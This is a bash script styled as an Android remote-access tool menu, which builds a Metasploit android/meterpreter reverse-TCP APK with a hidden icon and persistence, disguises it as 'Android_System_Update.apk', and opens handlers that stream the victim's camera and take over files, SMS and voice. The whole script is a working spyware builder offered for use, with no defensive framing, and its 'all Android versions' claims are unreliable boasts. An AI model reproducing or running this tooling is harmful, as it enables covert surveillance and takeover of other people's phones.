#!/bin/bash

# --- XXSZMSX V300 ULTIMATE (ALL ANDROID SUPPORT) ---
# NO HOST | NO PORT | 80MB | AUTO-CAM | FULL CONTROL

R='\033[1;31m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# --- LOGIN ---
clear
echo -e "${R}SYSTEM V300 - ALL-ANDROID COMPATIBLE${N}"
echo -en "${W}[?] KEY: ${N}"
read -s password
echo ""
if [[ $password != "topsecret2026" ]]; then exit 1; fi

while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ SYSTEM ]: v300.0 (ULTIMATE) | [ SYNC ]: ACTIVE"
echo -e "  [ TARGET ]: ALL ANDROID VERSIONS | [ SIZE ]: 80 MB"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${R}BUILD ALL-ANDROID APK (80MB)${N}"
echo -e "${W}[02]${N} ${R}OPEN RADAR & LIVE CAMERA${N}"
echo -e "${W}[03]${N} ${R}FULL HIJACK (FILES/SMS/VOICE)${N}"
echo -e "${W}[04]${N} ${G}CLEAN ALL DATA${N}"
echo -e "${W}[00]${N} ${W}EXIT${N}"

echo -en "\n${R}[V300-ULTIMATE] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] GENERATING MULTI-VERSION PAYLOAD...${N}"
        # سحب بيانات الجهاز تلقائياً
        target=$(hostname -I | awk '{print $1}')
        
        # بناء التطبيق مع دعم كامل للإصدارات وتخطي الحماية
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$target LPORT=4444 \
        AndroidHideAppIcon=true \
        AndroidPersistence=true \
        R -o "base.apk" > /dev/null 2>&1
        
        # حقن المساحة لزيادتها لـ 80 ميجا
        dd if=/dev/zero of=padding.dat bs=1M count=79 > /dev/null 2>&1
        cat base.apk padding.dat > "Android_System_Update.apk"
        rm base.apk padding.dat
        
        echo -e "\n${W}[+] SUCCESS: APK BUILT FOR ALL VERSIONS!${N}"
        sleep 2
        ;;
    2)
        echo -e "\n${R}[!] RADAR ACTIVE: WAITING FOR INSTANT STREAM...${N}"
        # الاستقبال وفتح الكاميرا فوراً
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z; sleep 8; webcam_stream -i 1"
        echo -e "\n${G}[*] Signal lost. Returning to menu...${N}"
        sleep 2
        ;;
    3)
        echo -e "\n${R}[!] ACCESSING FULL SYSTEM CONTROL...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit"
        sleep 2
        ;;
    4)
        rm -rf *.apk
        echo -e "${G}[+] All logs and APKs deleted.${N}"
        sleep 1
        ;;
    0) exit ;;
esac
done
